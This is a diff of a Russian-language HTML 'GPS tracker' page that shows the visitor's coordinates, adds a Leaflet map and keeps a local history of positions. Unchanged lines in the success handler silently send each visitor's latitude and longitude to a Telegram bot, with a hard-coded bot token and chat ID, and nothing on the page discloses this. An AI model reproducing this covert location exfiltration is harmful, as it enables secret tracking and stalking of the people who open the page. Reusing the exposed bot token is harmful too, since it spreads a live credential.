@@ -26,6 +26,7 @@
       margin-top: 20px;
       font-size: 18px;
       white-space: pre-line;
+      text-align: center;
     }
 
     .btn {
@@ -36,7 +37,7 @@
       padding: 12px 24px;
       font-size: 18px;
       cursor: pointer;
-      margin-top: 20px;
+      margin: 10px;
       transition: background 0.3s;
     }
 
@@ -46,7 +47,7 @@
 
     #map {
       width: 90%;
-      height: 300px;
+      height: 400px;
       margin: 20px 0;
       display: none;
       border-radius: 12px;
@@ -61,16 +62,26 @@
       margin-bottom: 20px;
     }
   </style>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 </head>
 <body>
   <h1>📍 GPS-Трекер</h1>
   <p id="status">Нажмите кнопку ниже, чтобы определить координаты:</p>
   <button class="btn" onclick="getLocation()">📍 Получить координаты</button>
   <button class="btn" onclick="getLocation()">🔄 Обновить координаты</button>
+  <button class="btn" onclick="showHistory()">🗺 Показать карту с историей</button>
   <a id="mapLink" href="#" target="_blank" style="display:none;">Открыть в Google Maps</a>
   <div id="map"></div>
 
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
+    let coordinates = JSON.parse(localStorage.getItem("coords_history") || "[]");
+
+    function saveCoord(lat, lon) {
+      coordinates.push({ lat, lon });
+      localStorage.setItem("coords_history", JSON.stringify(coordinates));
+    }
+
     function getLocation() {
       document.getElementById('status').textContent = "⏳ Получение координат...";
       if (navigator.geolocation) {
@@ -81,21 +92,20 @@
     }
 
     function success(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
 
       document.getElementById('status').textContent =
-        `✅ Координаты получены:\nШирота: ${latitude}\nДолгота: ${longitude}`;
+        `✅ Координаты получены:\nШирота: ${lat}\nДолгота: ${lon}`;
 
-      const mapLink = document.getElementById('mapLink');
-      mapLink.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
-      mapLink.style.display = 'inline-block';
+      document.getElementById('mapLink').href = `https://www.google.com/maps?q=${lat},${lon}`;
+      document.getElementById('mapLink').style.display = 'inline-block';
 
-      const mapDiv = document.getElementById('map');
-      mapDiv.innerHTML = `<iframe width="100%" height="100%" style="border:0"
-        src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"
-        allowfullscreen></iframe>`;
-      mapDiv.style.display = 'block';
+      document.getElementById('map').style.display = 'block';
+
+      saveCoord(lat, lon);
+
+      drawMap();
 
       // Telegram
       fetch("https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage", {
@@ -103,7 +113,7 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: 6249456543,
-          text: `📡 Геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}`
+          text: `📡 Геолокация:\nШирота: ${lat}\nДолгота: ${lon}`
         })
       });
     }
@@ -112,6 +122,30 @@
       console.error(err);
       document.getElementById('status').textContent =
         '❌ Не удалось получить координаты.';
+    }
+
+    function drawMap() {
+      const mapDiv = document.getElementById('map');
+      mapDiv.innerHTML = ''; // reset map
+      const map = L.map('map').setView([coordinates[0].lat, coordinates[0].lon], 13);
+
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors'
+      }).addTo(map);
+
+      coordinates.forEach(coord => {
+        L.marker([coord.lat, coord.lon]).addTo(map);
+      });
+    }
+
+    function showHistory() {
+      if (coordinates.length === 0) {
+        alert("История пустая. Сначала получи координаты.");
+        return;
+      }
+      document.getElementById('status').textContent = "🗺 Отображается история координат:";
+      document.getElementById('map').style.display = 'block';
+      drawMap();
     }
   </script>
 </body>
